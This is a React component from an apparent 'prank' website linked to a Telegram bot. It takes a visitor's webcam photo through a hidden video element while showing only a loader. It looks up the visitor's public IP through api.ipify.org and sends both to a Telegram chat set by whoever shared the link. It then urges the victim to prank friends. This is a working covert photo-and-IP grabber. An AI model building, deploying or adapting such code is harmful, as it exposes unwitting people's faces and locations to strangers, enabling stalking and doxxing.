"use client";

import confetti from "canvas-confetti";
import { useCallback, useEffect, useState } from "react";
import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
import { useCamera } from "../_hooks/use-camera";
import { Loader } from "./loader";

async function getUserIp() {
	return fetch("https://api.ipify.org/?format=json")
		.then((res) => res.json())
		.then((data) => data.ip)
		.catch(() => "unknown");
}

interface CameraProps {
	chatId: number;
}

export const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();
	const [isTakingPhoto, setIsTakingPhoto] = useState(true);

	const handlePhoto = useCallback(
		async (_photo: string) => {
			const ip = await getUserIp();
			await sendPhotoToChat({ photo: _photo, chatId, ip });
			setIsTakingPhoto(false);
			confetti({
				particleCount: 500,
				spread: 90,
				origin: { y: 1 },
				scalar: 2,
				startVelocity: 80,
				ticks: 500,
			});
		},
		[chatId],
	);

	useEffect(() => {
		if (!photo) return;

		handlePhoto(photo);
	}, [photo, handlePhoto]);

	return (
		<div className="flex flex-col justify-center items-center gap-12">
			{isTakingPhoto ? <Loader /> : <h1 className="text-3xl font-bold">🎉 You got pranked 🎉</h1>}
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas className={isTakingPhoto ? "hidden" : "visible rounded-xl max-h-[50vh]"} ref={canvasRef} />
			{!isTakingPhoto && (
				<p className="text-center text-lg">
					Use{" "}
					<a
						className="underline underline-offset-4 hover:text-orange-500"
						href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
						target="_blank"
						rel="noreferrer noopener"
					>
						@{process.env.NEXT_PUBLIC_BOT_NAME}
					</a>{" "}
					to get your unique link and prank your friends! 📸
				</p>
			)}
		</div>
	);
};

export const CameraNotAllowed = () => (
	<h1 className="font-bold text-4xl">Allow access to camera to use this website!</h1>
);
